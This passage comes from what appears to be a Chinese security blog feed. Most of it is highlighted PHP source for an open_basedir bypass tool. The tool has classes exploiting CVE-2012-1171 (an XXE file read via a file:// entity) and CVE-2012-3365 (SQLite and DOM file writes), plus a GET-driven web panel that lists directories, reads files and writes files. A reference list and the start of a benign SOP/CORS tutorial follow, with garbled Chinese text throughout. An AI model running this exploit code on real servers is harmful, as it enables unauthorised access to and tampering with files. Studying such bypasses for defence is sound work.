</span>&#123;</span><br><span class="line">		$regexp = <span class="string">'/File\((.*)\) is not within/'</span>;</span><br><span class="line">		preg_match($regexp, $errstr, $matches);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($matches[<span class="number">1</span>])) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;fileList[] = $matches[<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FileWriter</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $filePath;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setFilePath</span><span class="params">($filePath)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;filePath = $filePath;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFilePath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filePath;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FileReader</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $filePath;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setFilePath</span><span class="params">($filePath)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;filePath = $filePath;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFilePath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filePath;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Assistant class for DOMFileWriter &amp; DOMFileReader</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StreamExploiter</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $mode, $filePath, $fileContent;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">stream_close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$doc = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">		$doc-&gt;strictErrorChecking = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;mode) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">			$doc-&gt;loadHTML(<span class="keyword">$this</span>-&gt;fileContent);</span><br><span class="line">			$doc-&gt;removeChild($doc-&gt;firstChild);</span><br><span class="line">			$doc-&gt;saveHTMLFile(<span class="keyword">$this</span>-&gt;filePath);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'r'</span>:</span><br><span class="line">			$doc-&gt;resolveExternals = <span class="keyword">true</span>;</span><br><span class="line">			$doc-&gt;substituteEntities = <span class="keyword">true</span>;</span><br><span class="line">			$doc-&gt;loadXML(<span class="string">"&lt;!DOCTYPE doc [&lt;!ENTITY file SYSTEM \"file://&#123;$this-&gt;filePath&#125;\"&gt;]&gt;&lt;doc&gt;&amp;file;&lt;/doc&gt;"</span>, LIBXML_PARSEHUGE);</span><br><span class="line">			<span class="keyword">echo</span> $doc-&gt;documentElement-&gt;firstChild-&gt;nodeValue;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">stream_open</span><span class="params">($path, $mode, $options, &amp;$opened_path)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;filePath = substr($path, <span class="number">10</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;mode = $mode;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;fileContent = $data;</span><br><span class="line">		<span class="keyword">return</span> strlen($data);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DOMFileWriter</span> <span class="keyword">extends</span> <span class="title">FileWriter</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> extension_loaded(<span class="string">'dom'</span>) &amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.10'</span>, <span class="string">'&lt;='</span>) || version_compare(phpversion(), <span class="string">'5.4.0'</span>, <span class="string">'='</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// set it to global resource in order to trigger RSHUTDOWN</span></span><br><span class="line">		<span class="keyword">global</span> $_DOM_exploit_resource;</span><br><span class="line">		stream_wrapper_register(<span class="string">'exploit'</span>, <span class="string">'StreamExploiter'</span>);</span><br><span class="line">		$_DOM_exploit_resource = fopen(<span class="string">"exploit://&#123;$this-&gt;getFilePath()&#125;"</span>, <span class="string">'w'</span>);</span><br><span class="line">		fwrite($_DOM_exploit_resource, $content);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DOMFileReader</span> <span class="keyword">extends</span> <span class="title">FileReader</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> extension_loaded(<span class="string">'dom'</span>) &amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.10'</span>, <span class="string">'&lt;='</span>) || version_compare(phpversion(), <span class="string">'5.4.0'</span>, <span class="string">'='</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// set it to global resource in order to trigger RSHUTDOWN</span></span><br><span class="line">		<span class="keyword">global</span> $_DOM_exploit_resource;</span><br><span class="line">		stream_wrapper_register(<span class="string">'exploit'</span>, <span class="string">'StreamExploiter'</span>);</span><br><span class="line">		$_DOM_exploit_resource = fopen(<span class="string">"exploit://&#123;$this-&gt;getFilePath()&#125;"</span>, <span class="string">'r'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SqliteFileWriter</span> <span class="keyword">extends</span> <span class="title">FileWriter</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> is_writable(getcwd())</span><br><span class="line">			&amp;&amp; (extension_loaded(<span class="string">'sqlite3'</span>) || extension_loaded(<span class="string">'sqlite'</span>))</span><br><span class="line">			&amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.15'</span>, <span class="string">'&lt;='</span>) || (version_compare(phpversion(), <span class="string">'5.4.5'</span>, <span class="string">'&lt;='</span>) &amp;&amp; PHP_MINOR_VERSION == <span class="number">4</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">		$sqlite_class = extension_loaded(<span class="string">'sqlite3'</span>) ? <span class="string">'sqlite3'</span> : <span class="string">'SQLiteDatabase'</span>;</span><br><span class="line">		mkdir(<span class="string">':memory:'</span>);</span><br><span class="line">		$payload_path = getRelativePath(getcwd() . <span class="string">'/:memory:'</span>, <span class="keyword">$this</span>-&gt;getFilePath());</span><br><span class="line">		$payload = str_replace(<span class="string">'\''</span>, <span class="string">'\'\''</span>, $content);</span><br><span class="line">		$database = <span class="keyword">new</span> $sqlite_class(<span class="string">":memory:/&#123;$payload_path&#125;"</span>);</span><br><span class="line">		$database-&gt;exec(<span class="string">"CREATE TABLE foo (bar STRING)"</span>);</span><br><span class="line">		$database-&gt;exec(<span class="string">"INSERT INTO foo (bar) VALUES ('&#123;$payload&#125;')"</span>);</span><br><span class="line">		$database-&gt;close();</span><br><span class="line">		rmdir(<span class="string">':memory:'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// End of Core</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = <span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) ? $_GET[<span class="string">'action'</span>] : <span class="string">''</span>;</span><br><span class="line">$cwd = <span class="keyword">isset</span>($_GET[<span class="string">'cwd'</span>]) ? $_GET[<span class="string">'cwd'</span>] : getcwd();</span><br><span class="line">$cwd = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;</span><br><span class="line">$directorLister = fallback(<span class="keyword">array</span>(<span class="string">'GlobWrapperDirectoryLister'</span>, <span class="string">'RealpathBruteForceDirectoryLister'</span>));</span><br><span class="line">$fileWriter = fallback(<span class="keyword">array</span>(<span class="string">'DOMFileWriter'</span>, <span class="string">'SqliteFileWriter'</span>));</span><br><span class="line">$fileReader = fallback(<span class="keyword">array</span>(<span class="string">'DOMFileReader'</span>));</span><br><span class="line">$append = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="comment">#panel &#123;</span></span><br><span class="line">  height: <span class="number">200</span>px;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#panel &gt; pre &#123;</span></span><br><span class="line">  margin: <span class="number">0</span>;</span><br><span class="line">  height: <span class="number">200</span>px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div id=<span class="string">"panel"</span>&gt;</span><br><span class="line">&lt;pre id=<span class="string">"dl"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Directory Listing:&lt;/legend&gt;Current Directory: &lt;input name=<span class="string">"cwd"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $cwd; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Go"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (get_class($directorLister) === <span class="string">'RealpathBruteForceDirectoryLister'</span>): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$characters = <span class="keyword">isset</span>($_GET[<span class="string">'characters'</span>]) ? $_GET[<span class="string">'characters'</span>] : $directorLister-&gt;characters;</span><br><span class="line">$maxlength = <span class="keyword">isset</span>($_GET[<span class="string">'maxlength'</span>]) ? $_GET[<span class="string">'maxlength'</span>] : $directorLister-&gt;maxlength;</span><br><span class="line">$append = <span class="string">"&amp;characters=&#123;$characters&#125;&amp;maxlength=&#123;$maxlength&#125;"</span>;</span><br><span class="line"> </span><br><span class="line">$directorLister-&gt;setMaxlength($maxlength);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Search Characters: &lt;input name=<span class="string">"characters"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $characters; ?&gt;"</span>&gt;</span><br><span class="line">Maxlength of File: &lt;input name=<span class="string">"maxlength"</span> size=<span class="string">"1"</span> value=<span class="string">"&lt;?php echo $maxlength; ?&gt;"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>;<span class="meta">?&gt;</span></span><br><span class="line">Description      : &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $directorLister-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="keyword">isset</span>($_GET[<span class="string">'file_path'</span>]) ? $_GET[<span class="string">'file_path'</span>] : <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;pre id=<span class="string">"rf"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Read File :&lt;/legend&gt;File Path: &lt;input name=<span class="string">"file_path"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $file_path; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Read"</span>&gt;</span><br><span class="line">Description: &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $fileReader-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"action"</span> value=<span class="string">"rf"</span>&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;pre id=<span class="string">"wf"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Write File :&lt;/legend&gt;File Path   : &lt;input name=<span class="string">"file_path"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $file_path; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Write"</span>&gt;</span><br><span class="line">File Content: &lt;textarea cols=<span class="string">"70"</span> name=<span class="string">"content"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">Description : &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $fileWriter-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"action"</span> value=<span class="string">"wf"</span>&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;a href=<span class="string">"#dl"</span>&gt;Directory Listing&lt;/a&gt; | &lt;a href=<span class="string">"#rf"</span>&gt;Read File&lt;/a&gt; | &lt;a href=<span class="string">"#wf"</span>&gt;Write File&lt;/a&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($action === <span class="string">'rf'</span>): <span class="meta">?&gt;</span></span><br><span class="line">&lt;plaintext&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fileReader-&gt;setFilePath($file_path);</span><br><span class="line"><span class="keyword">echo</span> $fileReader-&gt;read();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">elseif</span> ($action === <span class="string">'wf'</span>): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">	$fileWriter-&gt;setFilePath($file_path);</span><br><span class="line">	$fileWriter-&gt;write($_GET[<span class="string">'content'</span>]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'The file should be written.'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Something goes wrong.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">&lt;ol&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$directorLister-&gt;setCurrentPath($cwd);</span><br><span class="line">$file_list = $directorLister-&gt;getFileList();</span><br><span class="line">$parent_path = dirname($cwd);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='?cwd=&#123;$parent_path&#125;&#123;$append&#125;#dl'&gt;Parent&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (count($file_list) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($file_list <span class="keyword">as</span> $file) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='?cwd=&#123;$cwd&#125;&#123;$file&#125;&#123;$append&#125;#dl'&gt;&#123;$file&#125;&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'No files found. The path is probably not a directory.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/ol&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/php-script-neixinming.png" alt="php-script-neixinming"></p>
<ul>
<li>â–² 2020.08.29 è„šæœ¬æš‚æœªæˆåŠŸç»•è¿‡ï¼Œä½†æä¾›äº†ä¸€ä¸ªç»•è¿‡çš„æ€è·¯</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHPç»•è¿‡open_basediråˆ—ç›®å½•çš„ç ”ç©¶</a></p>
</li>
<li><p><a href="https://www.jianshu.com/p/cf2cd07d02cf" target="_blank" rel="noopener">PHPç»•è¿‡open_basediré™åˆ¶æ“ä½œæ–‡ä»¶çš„ä¸‰ç§æ–¹æ³•</a></p>
</li>
<li><p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">php5å…¨ç‰ˆæœ¬ç»•è¿‡open_basedirè¯»æ–‡ä»¶è„šæœ¬</a></p>
</li>
<li><p><a href="https://blog.csdn.net/niexinming/article/details/53146095" target="_blank" rel="noopener">ç»•è¿‡open_basedirè¯»æ–‡ä»¶è„šæœ¬</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>php-about</category>
      </categories>
  </entry>
  <entry>
    <title>SOP_CORS_CSP</title>
    <url>/2020/10/27/md%E6%96%87%E4%BB%B6/sop_cors_csp/</url>
    <content><![CDATA[<h1 id="SOP-CORS-CSP"><a href="#SOP-CORS-CSP" class="headerlink" title="SOP_CORS_CSP"></a>SOP_CORS_CSP</h1><h2 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h2><ul>
<li>â­ é˜»æ­¢ä¸€ä¸ªé¡µé¢ä¸Šçš„æ¶æ„è„šæœ¬é€šè¿‡é¡µé¢çš„DOMå¯¹è±¡è·å¾—è®¿é—®å¦ä¸€ä¸ªé¡µé¢ä¸Šæ•æ„Ÿä¿¡æ¯çš„æƒé™</li>
<li>åŒæºçš„ç‰¹å¾<ul>
<li>åŒåè®® å¦‚ï¼š<a href="https://exp.org" target="_blank" rel="noopener">https://exp.org</a> ä¸ <a href="http://exp.org" target="_blank" rel="noopener">http://exp.org</a> ä¸åŒæº</li>
<li>åŒç«¯å£ å¦‚ï¼š<a href="http://exp.org" target="_blank" rel="noopener">http://exp.org</a> ä¸ <a href="http://exp.org:8080" target="_blank" rel="noopener">http://exp.org:8080</a> ä¸åŒæº</li>
<li>åŒåŸŸå å¦‚ï¼š<a href="http://aaa.org" target="_blank" rel="noopener">http://aaa.org</a> ä¸ <a href="http://bbb.org" target="_blank" rel="noopener">http://bbb.org</a> ä¸åŒæº</li>
</ul>
</li>
<li>åŒæºç­–ç•¥çš„é™åˆ¶<ul>
<li>é™åˆ¶äº†ä¸åŒæºä¹‹é—´çš„è¯·æ±‚äº¤äº’ï¼Œä¾‹å¦‚åœ¨ä½¿ç”¨XMLHttpRequestæˆ–fetchå‡½æ•°æ—¶åˆ™ä¼šå—åˆ°åŒæºç­–ç•¥çš„çº¦æŸ</li>
<li>é™åˆ¶æµè§ˆå™¨ä¸­ä¸åŒæºçš„æ¡†æ¶ä¹‹é—´æ˜¯ä¸èƒ½è¿›è¡Œjsçš„äº¤äº’æ“ä½œçš„ï¼Œä¾‹å¦‚é€šè¿‡iframeå’Œwindow.openäº§ç”Ÿçš„ä¸åŒæºçš„çª—å£</li>
</ul>
</li>
<li>åŒæºç­–ç•¥çš„æ³¨è§£<ul>
<li>å¯¹äº<code>&lt;a&gt;</code>ã€<code>&lt;script&gt;</code>ã€<code>&lt;img&gt;</code>ã€<code>&lt;video&gt;</code>ã€<code>&lt;link&gt;</code>è¿™ç±»å±æ€§å¸¦æœ‰srcï¼Œhrefçš„æ ‡ç­¾ï¼Œå…è®¸è·¨åŸŸåŠ è½½</li>
<li>è·¨åŸŸè¯·æ±‚å¯ä»¥å‘å‡ºï¼Œä½†æ˜¯æµè§ˆå™¨æŸ¥çœ‹è¿”å›åŒ…å‘ç°è·¨åŸŸä¸”æ— CORSå¤´åˆ™ä¼šä¸¢å¼ƒï¼Œè€Œä¸”ä¸åŒå­åŸŸä¹‹é—´é»˜è®¤æ˜¯ä¸åŒæºçš„</li>
<li>IEæœªå°†ç«¯å£å·åŠ å…¥åˆ°åŒæºç­–ç•¥çš„ç»„æˆéƒ¨åˆ†ä¹‹ä¸­ï¼Œå› æ­¤company.com:81/index.htmlå’Œcompany.com/index.htmlå±äºåŒæºå¹¶ä¸”ä¸å—ä»»ä½•é™åˆ¶</li>
</ul>
</li>
</ul>
<h2 id="è·¨åŸŸèµ„æºå…±äº«"><a href="#è·¨åŸŸèµ„æºå…±äº«" class="headerlink" title="è·¨åŸŸèµ„æºå…±äº«"></a>è·¨åŸŸèµ„æºå…±äº«</h2><h3 id="0X00-CORSç®€ä»‹"><a href="#0X00-CORSç®€ä»‹" class="headerlink" title="0X00 CORSç®€ä»‹"></a>0X00 CORSç®€ä»‹</h3><ul>
<li>CORSè·¨åŸŸèµ„æºå…±äº«ï¼ˆOrigin/Access-Control-Allow-Originï¼‰<ul>
<li>AJAXçš„XMLHttpRequestè¯·æ±‚</li>
<li>ç®€å•è¯·æ±‚ï¼ˆsimple requestï¼‰â€“ HEAD/GET/POST</li>
<li>éç®€å•è¯·æ±‚ï¼ˆnot-so-simple requestï¼‰â€“PUT/OPTIONS</li>
</ul>
</li>
<li>JSONPï¼ˆJSON with Padding)ï¼Œåº”ç”¨JSONçš„ä¸€ç§æ–°æ–¹æ³•<ul>
<li>JOSNPå…è®¸é¡µé¢æ¥å—å¦ä¸€ä¸ªåŸŸçš„JSONæ•°æ®ï¼Œé€šè¿‡åœ¨é¡µé¢å¢åŠ ä¸€ä¸ªå¯ä»¥ä»å…¶å®ƒåŸŸåŠ è½½å¸¦æœ‰å›è°ƒçš„JSONå“åº”çš„<code>&lt;script&gt;</code>æ ‡ç­¾</li>
</ul>
</li>
<li>ä»£ç†ï¼ˆé€šè¿‡æ¥å£çš„æ–¹å¼ï¼Œåå°è°ƒç”¨phpæ–‡ä»¶è·å–ç„¶åè¿”å›ç»™å‰ç«¯ï¼‰</li>
<li>è·¨æ–‡æ¡£é€šä¿¡ï¼ˆpostMessage()ä¼šå¼‚æ­¥çš„è§¦å‘windowä¸Šçš„onmessageäº‹ä»¶ï¼‰</li>
<li>document.domainï¼ˆè§£å†³ä¸åŒwindowä¹‹é—´ä¸èƒ½è¿›è¡Œäº¤äº’æ“ä½œçš„é—®é¢˜ï¼‰</li>
<li>window.nameï¼ˆwindow.nameåœ¨é¡µé¢çš„ç”Ÿå‘½å‘¨æœŸé‡Œå…±äº«ä¸€ä¸ªwindow.nameï¼‰</li>
<li>WebSocketï¼ˆæµè§ˆå™¨å…è®¸è„šæœ¬ç›´è¿ä¸€ä¸ªWebSocketåœ°å€è€Œä¸ç®¡åŒæºç­–ç•¥ï¼‰</li>
</ul>
<h3 id="0X01-CORS"><a href="#0X01-CORS" class="headerlink" title="0X01 CORS"></a>0X01 CORS</h3><ul>
<li>â–² CORSå¤´å°±æ˜¯ä¸ºäº†çªç ´ä¸åŒæºä¹‹é—´çš„è¯·æ±‚äº¤äº’è¿™ä¸€é™åˆ¶è€Œäº§ç”Ÿçš„</li>
<li>åªè¦HTTPè¿”å›<code>Access-Control-Allow-Origin:http://test2.www.xyz</code>ï¼Œtest2.<a href="http://www.xyzçš„è·¨åŸŸè¯·æ±‚çš„å“åº”ä¼šè¢«æµè§ˆå™¨æ­£ç¡®çš„è¿”å›" target="_blank" rel="noopener">www.xyzçš„è·¨åŸŸè¯·æ±‚çš„å“åº”ä¼šè¢«æµè§ˆå™¨æ­£ç¡®çš„è¿”å›</a></li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?</span><br><span class="line">    header(&quot;Access-Control-Allow-Origin:http://test2.www.xyz&quot;);</span><br><span class="line">    echo &quot;flag&#123;this_is_flag&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">//Consoleå°è¾“å…¥</span><br><span class="line">fetch(&apos;//test1.www.xyz/1.php&apos;).then(function(data)&#123;</span><br><span class="line">  return data.text()</span><br><span class="line">&#125;).then(function(data)&#123;</span><br><span class="line">  console.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/cors-example.png" alt="cors-example"></p>
<ul>
<li>å¦‚æœè®¾ç½®<code>Access-Control-Allow-Origin:*</code>ï¼Œåˆ™æ‰€æœ‰çš„è·¨åŸŸè®¿é—®å“åº”éƒ½ä¼šè¢«å…è®¸</li>
<li>å¦‚æœè¯·æ±‚éœ€è¦å¸¦ä¸ŠCookieï¼Œåˆ™éœ€è¦æœåŠ¡å™¨è®¾ç½®<code>Access-Control-Allow-Credentials:true</code><ul>
